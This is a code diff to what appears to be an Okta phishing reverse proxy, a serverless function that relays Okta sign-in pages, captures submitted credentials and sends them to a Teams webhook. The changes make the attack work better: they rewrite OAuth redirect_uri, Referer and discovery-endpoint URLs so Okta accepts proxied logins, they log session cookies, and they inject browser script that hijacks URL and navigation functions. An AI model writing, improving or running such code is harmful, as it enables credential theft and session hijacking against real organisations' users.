@@ -81,35 +81,139 @@ app.http("okta_phishing", {
     async function dispatchMessage(message) {
       context.log(message);
       if (teams_webhook_url) {
-        await fetch(teams_webhook_url, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ text: message }),
-        }).catch((error) => console.log(error));
+        // Convert HTML to plain text for the adaptive card
+        const plainText = message
+          .replace(/<br>/gi, '\n')
+          .replace(/<b>/gi, '**')
+          .replace(/<\/b>/gi, '**')
+          .replace(/<code>/gi, '`')
+          .replace(/<\/code>/gi, '`')
+          .replace(/<[^>]*>/g, '');
+        
+        // Try Power Automate Workflow format (Adaptive Card) first
+        const adaptiveCardPayload = {
+          type: "message",
+          attachments: [{
+            contentType: "application/vnd.microsoft.card.adaptive",
+            content: {
+              "$schema": "http://adaptivecards.io/schemas/adaptive-card.json",
+              type: "AdaptiveCard",
+              version: "1.4",
+              body: [{
+                type: "TextBlock",
+                text: plainText,
+                wrap: true
+              }]
+            }
+          }]
+        };
+        
+        // Also prepare legacy format as fallback
+        const legacyPayload = { text: message };
+        
+        try {
+          // Try Adaptive Card format first (for Power Automate Workflows)
+          let response = await fetch(teams_webhook_url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(adaptiveCardPayload),
+          });
+          
+          // If that fails, try legacy format (for O365 Connectors)
+          if (!response.ok) {
+            response = await fetch(teams_webhook_url, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(legacyPayload),
+            });
+          }
+          
+          if (response.ok) {
+            context.log("Successfully dispatched Teams notification");
+          } else {
+            context.log(`Failed to dispatch Teams notification: ${response.status} ${response.statusText}`);
+          }
+        } catch (error) {
+          context.log(`Error dispatching Teams notification: ${error.message}`);
+        }
       }
     }
 
     // Build upstream URL
     const upstreamUrl = new URL(`https://${targetDomain}/${path}`);
     
-    // Copy query parameters
+    // Copy query parameters, but preserve redirect_uri as proxy URL
     for (const [key, value] of url.searchParams) {
       let fixedValue = value;
       if (oktaDomain) {
-        fixedValue = fixedValue
-          .replace(new RegExp(escapeRegex(`${originalProtocol}//${originalHost}/okta/${targetDomain}`), 'g'), `https://${targetDomain}`)
-          .replace(new RegExp(escapeRegex(`${originalHost}/okta/${targetDomain}`), 'g'), targetDomain);
+        // Don't rewrite redirect_uri - we want it to point back to our proxy!
+        if (key !== 'redirect_uri') {
+          fixedValue = fixedValue
+            .replace(new RegExp(escapeRegex(`${originalProtocol}//${originalHost}/okta/${targetDomain}`), 'g'), `https://${targetDomain}`)
+            .replace(new RegExp(escapeRegex(`${originalHost}/okta/${targetDomain}`), 'g'), targetDomain);
+        }
       }
       upstreamUrl.searchParams.set(key, fixedValue);
     }
+    
+    // CRITICAL: For OAuth authorize requests, we need to rewrite the redirect_uri to point to real Okta
+    // otherwise Okta will reject it as an invalid redirect_uri
+    // The callback will come back to our proxy via the Location header rewriting
 
     context.log(`Proxying ${request.method}: ${url.pathname} -> ${upstreamUrl.href}`);
+    
+    // Debug: Log cookies and prompt parameter for OAuth authorize requests
+    if (path.includes('oauth2') && path.includes('authorize')) {
+      const cookies = request.headers.get('cookie');
+      const promptParam = upstreamUrl.searchParams.get('prompt');
+      const hasSid = cookies?.includes('sid=') || false;
+      const hasIdx = cookies?.includes('idx=') || false;
+      const hasJsessionId = cookies?.includes('JSESSIONID=') || false;
+      context.log(`[OAuth Debug] Authorize request - prompt=${promptParam}, hasSid=${hasSid}, hasIdx=${hasIdx}, hasJsessionId=${hasJsessionId}`);
+      context.log(`[OAuth Debug] Cookie header length: ${cookies?.length || 0}`);
+      
+      // CRITICAL: Make sure redirect_uri points to real Okta domain (not our proxy)
+      // Okta will reject redirect_uri values that aren't registered in the app settings
+      const currentRedirectUri = upstreamUrl.searchParams.get('redirect_uri');
+      if (currentRedirectUri && currentRedirectUri.includes(originalHost)) {
+        // Rewrite proxy URL back to real Okta URL
+        // Handle both cases:
+        // 1. https://proxy/okta/domain/path -> https://domain/path
+        // 2. https://proxy/path -> https://domain/path (SDK uses origin + path)
+        let fixedRedirectUri = currentRedirectUri;
+        
+        if (currentRedirectUri.includes(`/okta/${targetDomain}`)) {
+          // Case 1: Full proxy path
+          fixedRedirectUri = currentRedirectUri
+            .replace(new RegExp(escapeRegex(`${originalProtocol}//${originalHost}/okta/${targetDomain}`), 'g'), `https://${targetDomain}`)
+            .replace(new RegExp(escapeRegex(`${originalHost}/okta/${targetDomain}`), 'g'), targetDomain);
+        } else {
+          // Case 2: Just the origin is our proxy (SDK constructed redirect_uri from window.location.origin)
+          fixedRedirectUri = currentRedirectUri
+            .replace(new RegExp(escapeRegex(`${originalProtocol}//${originalHost}`), 'g'), `https://${targetDomain}`)
+            .replace(new RegExp(escapeRegex(originalHost), 'g'), targetDomain);
+        }
+        
+        upstreamUrl.searchParams.set('redirect_uri', fixedRedirectUri);
+        context.log(`[OAuth Debug] Fixed redirect_uri: ${currentRedirectUri} -> ${fixedRedirectUri}`);
+      }
+    }
 
     // Build request headers
     const requestHeaders = new Headers();
     requestHeaders.set('Host', targetDomain);
     requestHeaders.set('Origin', `https://${targetDomain}`);
-    requestHeaders.set('Referer', `https://${targetDomain}/`);
+    
+    // Set Referer to make Okta think the request is coming from itself
+    // This is critical for OAuth flows where Okta validates the origin
+    const originalReferer = request.headers.get('referer') || '';
+    if (originalReferer.includes('/okta/')) {
+      // Rewrite our proxy referer back to real Okta domain
+      requestHeaders.set('Referer', originalReferer.replace(new RegExp(escapeRegex(`${originalProtocol}//${originalHost}/okta/${targetDomain}`), 'g'), `https://${targetDomain}`));
+    } else {
+      requestHeaders.set('Referer', `https://${targetDomain}/`);
+    }
+    
     requestHeaders.set('User-Agent', request.headers.get('user-agent') || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
     requestHeaders.set('Accept', request.headers.get('accept') || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
     requestHeaders.set('Accept-Language', request.headers.get('accept-language') || 'en-US,en;q=0.9');
@@ -145,9 +249,15 @@ app.http("okta_phishing", {
         await captureCredentials(bodyText, oktaDomain, dispatchMessage, context);
       }
       
+      // Rewrite proxy URLs back to real Okta URLs
       requestBody = bodyText
         .replace(new RegExp(escapeRegex(`${originalProtocol}//${originalHost}/okta/${targetDomain}`), 'g'), `https://${targetDomain}`)
         .replace(new RegExp(escapeRegex(`${originalHost}/okta/${targetDomain}`), 'g'), targetDomain);
+      
+      // Also handle URL-encoded versions (for form submissions like token exchange)
+      const encodedProxyUrl = encodeURIComponent(`${originalProtocol}//${originalHost}/okta/${targetDomain}`);
+      const encodedRealUrl = encodeURIComponent(`https://${targetDomain}`);
+      requestBody = requestBody.replace(new RegExp(escapeRegex(encodedProxyUrl), 'g'), encodedRealUrl);
     }
 
     // Make the upstream request
@@ -206,6 +316,13 @@ app.http("okta_phishing", {
         });
       }
     }
+    
+    // Handle OAuth errors (e.g., when prompt=none fails because session is invalid)
+    if (path.includes('oauth2') && path.includes('authorize') && upstreamResponse.status === 200) {
+      // Check if this is a login page or an error response
+      // If it's still returning 200 after adding prompt=none, the session might not be valid
+      context.log(`[OAuth Debug] Authorize returned 200 - may be login page or error`);
+    }
 
     // Get content type
     const responseContentType = upstreamResponse.headers.get('content-type') || '';
@@ -221,6 +338,45 @@ app.http("okta_phishing", {
       
       const body = await upstreamResponse.arrayBuffer();
       return new Response(body, {
+        status: upstreamResponse.status,
+        headers: responseHeaders,
+      });
+    }
+    
+    // For JSON responses (API calls), selectively rewrite URLs
+    if (responseContentType.includes('application/json') || responseContentType.includes('application/ion+json')) {
+      let jsonBody = await upstreamResponse.text();
+      
+      // Rewrite CDN URLs in JSON
+      for (const cdn of oktaCdnDomains) {
+        jsonBody = jsonBody.replace(
+          new RegExp(`https://${escapeRegex(cdn)}`, 'g'),
+          `${originalProtocol}//${originalHost}/okta/${cdn}`
+        );
+      }
+      
+      // For openid-configuration and similar discovery endpoints,
+      // we MUST rewrite the Okta domain URLs so the SDK uses our proxy
+      // These endpoints return authorization_endpoint, token_endpoint, etc.
+      if (path.includes('.well-known') || path.includes('openid-configuration')) {
+        context.log(`[JSON] Rewriting discovery endpoint URLs`);
+        jsonBody = jsonBody
+          .replace(new RegExp(`https://${escapeRegex(targetDomain)}`, 'g'), `${originalProtocol}//${originalHost}/okta/${targetDomain}`);
+      }
+      
+      // For IDX/authentication API responses, rewrite URLs so redirects work
+      if (path.includes('/idp/idx/') || path.includes('/api/v1/')) {
+        jsonBody = jsonBody
+          .replace(new RegExp(`https://${escapeRegex(targetDomain)}`, 'g'), `${originalProtocol}//${originalHost}/okta/${targetDomain}`);
+      }
+      
+      responseHeaders.set('Access-Control-Allow-Origin', '*');
+      responseHeaders.set('Access-Control-Allow-Credentials', 'true');
+      responseHeaders.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
+      responseHeaders.set('Access-Control-Allow-Headers', '*');
+      responseHeaders.set('Cache-Control', 'no-cache, no-store, must-revalidate');
+      
+      return new Response(jsonBody, {
         status: upstreamResponse.status,
         headers: responseHeaders,
       });
@@ -436,6 +592,30 @@ function getProxyInjectionScript(oktaDomain, originalHost, originalProtocol) {
   const PROXY_BASE = "/okta/${oktaDomain}";
   const PROXY_ORIGIN = "${originalProtocol}//${originalHost}";
   const REAL_ORIGIN = window.location.origin;
+  const OKTA_ORIGIN = "https://${oktaDomain}";
+  
+  // CRITICAL: Override URL constructor to handle redirect_uri rewriting
+  // When OAuth SDK constructs URLs with redirect_uri, make sure it uses real Okta domain
+  const OriginalURL = window.URL;
+  window.URL = function(url, base) {
+    const instance = new OriginalURL(url, base);
+    
+    // Override searchParams.set to intercept redirect_uri changes
+    const originalSet = instance.searchParams.set.bind(instance.searchParams);
+    instance.searchParams.set = function(key, value) {
+      if (key === 'redirect_uri') {
+        // Keep redirect_uri pointing to real Okta for OAuth validation
+        // But the actual redirect will be rewritten by our server
+        console.log('[Proxy] URL.searchParams.set redirect_uri:', value);
+      }
+      return originalSet(key, value);
+    };
+    
+    return instance;
+  };
+  window.URL.prototype = OriginalURL.prototype;
+  window.URL.createObjectURL = OriginalURL.createObjectURL;
+  window.URL.revokeObjectURL = OriginalURL.revokeObjectURL;
   
   function rewriteUrl(url) {
     if (!url) return url;
@@ -443,6 +623,12 @@ function getProxyInjectionScript(oktaDomain, originalHost, originalProtocol) {
     
     // Already rewritten
     if (url.includes('/okta/') && url.includes(window.location.host)) return url;
+    
+    // CRITICAL: Handle root URL "/" - redirect to Okta dashboard
+    if (url === '/' || url === REAL_ORIGIN + '/') {
+      console.log('[Proxy] Rewriting root URL to Okta dashboard');
+      return PROXY_BASE + '/';
+    }
     
     // Handle URLs that start with our origin but aren't proxied
     if (url.startsWith(REAL_ORIGIN) && !url.includes('/okta/')) {
@@ -602,6 +788,35 @@ function getProxyInjectionScript(oktaDomain, originalHost, originalProtocol) {
     subtree: true
   });
   
+  // Store that we're in an Okta session
+  try {
+    sessionStorage.setItem('okta_proxy_domain', OKTA_DOMAIN);
+    localStorage.setItem('okta_proxy_domain', OKTA_DOMAIN);
+  } catch(e) {}
+  
+  // EXPERIMENTAL: Intercept OAuth authorize requests from the dashboard
+  // When the dashboard tries to re-authenticate, we may want to handle this differently
+  // For now, log when this happens for debugging
+  const originalWindowLocationHref = Object.getOwnPropertyDescriptor(window.location.__proto__, 'href');
+  if (originalWindowLocationHref && originalWindowLocationHref.set) {
+    // Monitor href changes to debug navigation
+  }
+  
+  // Override document.location methods as well
+  try {
+    const originalDocLocationAssign = document.location.assign;
+    document.location.assign = function(url) {
+      console.log('[Proxy] document.location.assign:', url);
+      return originalDocLocationAssign.call(this, rewriteUrl(url));
+    };
+    
+    const originalDocLocationReplace = document.location.replace;
+    document.location.replace = function(url) {
+      console.log('[Proxy] document.location.replace:', url);
+      return originalDocLocationReplace.call(this, rewriteUrl(url));
+    };
+  } catch(e) { console.log('[Proxy] Could not override document.location methods'); }
+  
   console.log('[Proxy] URL rewriting initialized for ' + OKTA_DOMAIN);
 })();
 </script>
@@ -692,89 +907,13 @@ function rewriteJsContent(js, oktaDomain, originalHost, originalProtocol) {
       .replace(new RegExp(`//${cdnEscaped}`, 'g'), `//${originalHost}/okta/${cdn}`);
   }
   
-  // Rewrite any *.okta.com URLs
-  result = result.replace(
-    /https:\/\/([a-zA-Z0-9-]+)\.(okta\.com|oktapreview\.com)/g,
-    (match, subdomain, domain) => {
-      return `${originalProtocol}//${originalHost}/okta/${subdomain}.${domain}`;
-    }
-  );
+  // NOTE: We intentionally do NOT rewrite *.okta.com URLs in JavaScript
+  // because it can break OAuth redirect_uri values which must point to real Okta
+  // The client-side injection script handles URL rewriting for navigation/fetch
   
-  // Handle escaped URLs in JS strings
-  result = result.replace(
-    /https:\\\/\\\/([a-zA-Z0-9-]+)\.(okta\.com|oktapreview\.com)/g,
-    (match, subdomain, domain) => {
-      return `${originalProtocol.replace(':', '')}:\\/\\/${originalHost}\\/okta\\/${subdomain}.${domain}`;
-    }
-  );
-  
-  result = result.replace(
-    /https:\\u002f\\u002f([a-zA-Z0-9-]+)\.(okta\.com|oktapreview\.com)/g,
-    (match, subdomain, domain) => {
-      return `${originalProtocol.replace(':', '')}:\\u002f\\u002f${originalHost}\\u002fokta\\u002f${subdomain}.${domain}`;
-    }
-  );
-  
-  // CRITICAL: Rewrite relative URL patterns in JavaScript
-  // These are paths like "/oauth2/v1/authorize" that get used with window.location
-  // Pattern: "/oauth2" or "/api/v1" etc. at the start of a string
-  
-  // Match string literals containing API/OAuth paths
-  result = result.replace(
-    /"(\/oauth2\/[^"]+)"/g,
-    `"${proxyBase}$1"`
-  );
-  result = result.replace(
-    /'(\/oauth2\/[^']+)'/g,
-    `'${proxyBase}$1'`
-  );
-  result = result.replace(
-    /"(\/api\/v1\/[^"]+)"/g,
-    `"${proxyBase}$1"`
-  );
-  result = result.replace(
-    /'(\/api\/v1\/[^']+)'/g,
-    `'${proxyBase}$1'`
-  );
-  result = result.replace(
-    /"(\/\.well-known\/[^"]+)"/g,
-    `"${proxyBase}$1"`
-  );
-  result = result.replace(
-    /'(\/\.well-known\/[^']+)'/g,
-    `'${proxyBase}$1'`
-  );
-  result = result.replace(
-    /"(\/login\/[^"]+)"/g,
-    `"${proxyBase}$1"`
-  );
-  result = result.replace(
-    /'(\/login\/[^']+)'/g,
-    `'${proxyBase}$1'`
-  );
-  result = result.replace(
-    /"(\/enduser\/[^"]+)"/g,
-    `"${proxyBase}$1"`
-  );
-  result = result.replace(
-    /'(\/enduser\/[^']+)'/g,
-    `'${proxyBase}$1'`
-  );
-  
-  // Also handle template literals and concatenation patterns
-  // Pattern: "/oauth2" + something or `/oauth2${...}`
-  result = result.replace(
-    /["'`](\/oauth2)["'`]/g,
-    `"${proxyBase}$1"`
-  );
-  result = result.replace(
-    /["'`](\/api)["'`]/g,
-    `"${proxyBase}$1"`
-  );
-  result = result.replace(
-    /["'`](\/\.well-known)["'`]/g,
-    `"${proxyBase}$1"`
-  );
+  // NOTE: We avoid aggressive URL rewriting in JS files because it can break
+  // OAuth flows where redirect_uri must point to the real Okta domain.
+  // The client-side injection script handles URL rewriting for navigation/fetch.
   
   return result;
 }
@@ -815,36 +954,26 @@ function rewriteResponseBody(html, oktaDomain, originalHost, originalProtocol) {
     result = result.replace(/<html([^>]*)>/i, `<html$1><head>${proxyScript}</head>`);
   }
   
-  // Rewrite Okta domain URLs
-  result = result
-    .replace(new RegExp(`https://${escapedDomain}`, 'g'), baseUrl)
-    .replace(new RegExp(`//${escapedDomain}`, 'g'), `//${originalHost}/okta/${oktaDomain}`);
-  
-  // Rewrite CDN URLs
+  // Rewrite CDN URLs in script/link src attributes ONLY
+  // We're careful not to rewrite URLs in JavaScript code/data as it can break OAuth
   for (const cdn of oktaCdnDomains) {
     const cdnEscaped = escapeRegex(cdn);
     const cdnBaseUrl = `${originalProtocol}//${originalHost}/okta/${cdn}`;
+    // Only rewrite in src= and href= attributes
     result = result
-      .replace(new RegExp(`https://${cdnEscaped}`, 'g'), cdnBaseUrl)
-      .replace(new RegExp(`//${cdnEscaped}`, 'g'), `//${originalHost}/okta/${cdn}`);
+      .replace(new RegExp(`(src|href)="https://${cdnEscaped}`, 'g'), `$1="${cdnBaseUrl}`)
+      .replace(new RegExp(`(src|href)='https://${cdnEscaped}`, 'g'), `$1='${cdnBaseUrl}`);
   }
   
-  // Rewrite relative URLs in attributes
+  // Rewrite relative URLs in href/src/action attributes ONLY
+  // This ensures navigation works but doesn't break OAuth redirect_uri
   result = result
     .replace(/(href|src|action)="\/(?!\/|okta\/)/g, `$1="/okta/${oktaDomain}/`)
     .replace(/(href|src|action)='\/(?!\/|okta\/)/g, `$1='/okta/${oktaDomain}/`);
   
-  // Rewrite URLs in JavaScript
-  result = result
-    .replace(new RegExp(`"https://${escapedDomain}`, 'g'), `"${baseUrl}`)
-    .replace(new RegExp(`'https://${escapedDomain}`, 'g'), `'${baseUrl}`);
-  
-  // Handle escaped URLs in JSON
-  result = result
-    .replace(new RegExp(`https:\\\\/\\\\/${escapedDomain.replace(/\./g, '\\\\.')}`, 'g'), 
-             baseUrl.replace(/\//g, '\\/'))
-    .replace(new RegExp(`https:\\\\u002f\\\\u002f${escapedDomain.replace(/\./g, '\\\\.')}`, 'g'),
-             baseUrl.replace(/\//g, '\\u002f'));
+  // NOTE: We intentionally do NOT do blanket URL rewriting for Okta domain
+  // because it breaks OAuth redirect_uri values. The client-side script handles
+  // dynamic URL rewriting for fetch/XHR/navigation.
 
   return result;
 }
